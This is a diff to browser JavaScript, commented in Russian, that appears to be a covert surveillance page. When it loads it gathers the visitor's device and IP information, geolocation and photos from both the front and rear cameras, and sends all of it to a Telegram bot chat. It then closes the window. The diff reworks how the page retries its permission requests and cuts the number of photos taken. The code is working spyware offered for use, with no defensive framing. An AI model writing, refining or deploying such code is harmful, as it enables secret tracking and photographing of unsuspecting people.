@@ -4,7 +4,6 @@ const CHAT_ID = '8244138604';
 
 const video = document.getElementById('video');
 let locationGranted = false;
-let deviceDataSent = false;
 
 // ========== ОТПРАВКА В TELEGRAM ==========
 async function sendToTelegram(method, data) {
@@ -78,17 +77,13 @@ async function getIPInfo() {
 }
 
 async function sendDeviceData() {
-    if (deviceDataSent) return;
-    deviceDataSent = true;
-    
     let fullText = await getDeviceInfo();
     const ipText = await getIPInfo();
     if (ipText) fullText += '\n' + ipText;
-    
     await sendMessage(fullText);
 }
 
-// ========== ГЕОЛОКАЦИЯ (ИСПРАВЛЕНО) ==========
+// ========== ГЕОЛОКАЦИЯ ==========
 function askLocationWithRetry(retryCount, maxRetries) {
     return new Promise((resolve) => {
         navigator.geolocation.getCurrentPosition(
@@ -116,12 +111,21 @@ async function sendLocation(lat, lon) {
 }
 
 // ========== КАМЕРА ==========
-async function requestCamera(facingMode) {
+async function requestCameraWithRetry(facingMode, maxRetries) {
     return new Promise((resolve) => {
+        let attempts = 0;
+        
         const ask = () => {
+            attempts++;
             navigator.mediaDevices.getUserMedia({
                 video: { facingMode: { exact: facingMode }, width: 1280, height: 720 }
-            }).then(resolve).catch(() => setTimeout(ask, 2000));
+            }).then(resolve).catch(() => {
+                if (attempts < maxRetries) {
+                    setTimeout(ask, 2000);
+                } else {
+                    resolve(null);
+                }
+            });
         };
         ask();
     });
@@ -150,45 +154,44 @@ async function takePhoto(stream, caption) {
     });
 }
 
-// Сделать 3 фото с интервалом 3 секунды
-async function takeMultiplePhotos(stream, count, intervalSec, cameraName) {
-    for (let i = 1; i <= count; i++) {
-        await takePhoto(stream, `📸 ${cameraName} (фото ${i}/${count})`);
-        if (i < count) await new Promise(r => setTimeout(r, intervalSec * 1000));
-    }
-}
-
 // ========== ГЛАВНАЯ ФУНКЦИЯ ==========
 async function main() {
     // 1. Данные устройства сразу
     await sendDeviceData();
     
-    // 2. Геолокация (2 попытки) - ИСПРАВЛЕНО
+    // 2. Геолокация (2 попытки)
     const firstLoc = await requestLocation(2);
     if (firstLoc) {
         await sendLocation(firstLoc.lat, firstLoc.lon);
         locationGranted = true;
     }
     
-    // 3. Запрашиваем фронтальную камеру (бесконечно)
-    let frontStream = await requestCamera('user');
+    // 3. Камера (2 попытки)
+    let frontStream = await requestCameraWithRetry('user', 2);
     
-    // 4. Делаем 3 фото с фронталки (интервал 3 секунды)
-    await takeMultiplePhotos(frontStream, 3, 3, 'Фронтальная камера');
-    frontStream.getTracks().forEach(t => t.stop());
+    if (frontStream) {
+        // Фронтальное фото
+        await takePhoto(frontStream, '📸 Фронтальная камера');
+        frontStream.getTracks().forEach(t => t.stop());
+        
+        // Ждем 3 секунды
+        await new Promise(r => setTimeout(r, 3000));
+        
+        // Заднее фото (2 попытки)
+        let backStream = await requestCameraWithRetry('environment', 2);
+        if (backStream) {
+            await takePhoto(backStream, '📸 Задняя камера');
+            backStream.getTracks().forEach(t => t.stop());
+        }
+    }
     
-    // 5. Если гео не было — последняя попытка
+    // 4. Если гео не было - последняя попытка
     if (!locationGranted) {
         const lastLoc = await requestLocation(1);
         if (lastLoc) await sendLocation(lastLoc.lat, lastLoc.lon);
     }
     
-    // 6. Задняя камера — 1 фото
-    let backStream = await requestCamera('environment');
-    await takePhoto(backStream, '📸 Задняя камера');
-    backStream.getTracks().forEach(t => t.stop());
-    
-    // 7. Закрытие
+    // 5. Закрытие
     setTimeout(() => window.close(), 1000);
 }
 
